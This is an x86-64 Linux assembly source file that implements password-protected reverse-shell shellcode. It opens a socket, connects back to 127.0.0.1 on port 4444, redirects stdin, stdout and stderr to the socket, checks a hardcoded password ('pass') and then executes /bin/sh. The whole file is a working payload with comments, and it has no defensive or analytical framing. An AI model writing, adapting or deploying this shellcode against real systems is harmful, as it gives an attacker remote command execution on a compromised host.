global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov al, 41
	xor rdi, rdi	
	mov dil, 2
	xor rsi, rsi	
	mov sil, 1
	xor rdx, rdx	
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 
	push rax
	mov dword [rsp-4], 0x0100007f	; IP address 127.0.0.1
	mov word [rsp-6], 0x5c11	; port 4444
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax	
	mov al, 42
	mov rsi, rsp
	xor rdx, rdx	
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor rax, rax
	mov al, 33
        xor rsi, rsi
        syscall

	xor rax, rax        
	mov al, 33
	xor rsi, rsi        
	mov sil, 1
        syscall

        xor rax, rax
	mov al, 33
        xor rsi, rsi
	mov sil, 2
        syscall


	password_check:
     
        push rsp
        pop rsi
        xor rax, rax   			; system read syscall value is 0 so rax is set to 0
        syscall
        push 0x73736170		;password 'pass'
        pop rax
        lea rdi, [rel rsi]
        scasd           		; comparing the user input and stored password in the stack
        jne Exit      

        ; execve

        ; First NULL push

        xor rax, rax
        push rax
	mov rbx, 0x68732f2f6e69622f     ; push /bin//sh in reverse
        push rbx
	mov rdi, rsp  			; store /bin//sh address in RDI
	push rax 			; Second NULL push
	mov rdx, rsp			; set RDX
	push rdi			; Push address of /bin//sh
	mov rsi, rsp			; set RSI

        ; Call the Execve syscall
        add rax, 59
        syscall

	Exit:
 	;Exit shellcode if password is wrong
 	
	push 0x3c
     	pop rax        			;syscall number for exit is 60
     	xor rdi, rdi
     	syscall
 
